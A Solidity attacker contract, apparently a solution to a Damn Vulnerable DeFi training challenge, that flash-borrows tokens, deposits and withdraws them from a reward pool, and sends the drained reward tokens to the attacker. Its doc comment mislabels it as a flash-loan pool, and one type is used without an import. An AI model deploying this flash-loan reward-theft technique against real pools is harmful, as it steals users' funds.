pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

/**
 * @notice A simple pool to get flash loans of DVT
 */
contract RewarderAttacker {

  TheRewarderPool public rewarder;
  ERC20 public liquidityToken;
  ERC20 public rewardToken;
  FlashLoanerPool public flashLoaner;
  address public rewarderAddress;
  address public attacker;

  constructor(
    address _rewarderAddress,
    address liquidityTokenAddress,
    address flashLoanerAddress,
    address rewardTokenAddress) 
  public {
    rewarderAddress = _rewarderAddress;
    rewarder = TheRewarderPool(rewarderAddress);
    liquidityToken = DamnValuableToken(liquidityTokenAddress);
    flashLoaner = FlashLoanerPool(flashLoanerAddress);
    rewardToken = DamnValuableToken(rewardTokenAddress);
    attacker = msg.sender;
  }

  function attack(uint256 amount) public {
    flashLoaner.flashLoan(amount);
  }

  function receiveFlashLoan(uint256 amount) external {
    liquidityToken.approve(rewarderAddress, amount);
    rewarder.deposit(amount);
    rewarder.withdraw(amount);
    liquidityToken.transfer(msg.sender, amount);
    uint stolenTokenNumber = rewardToken.balanceOf(address(this));
    rewardToken.transfer(attacker, stolenTokenNumber);
  }

}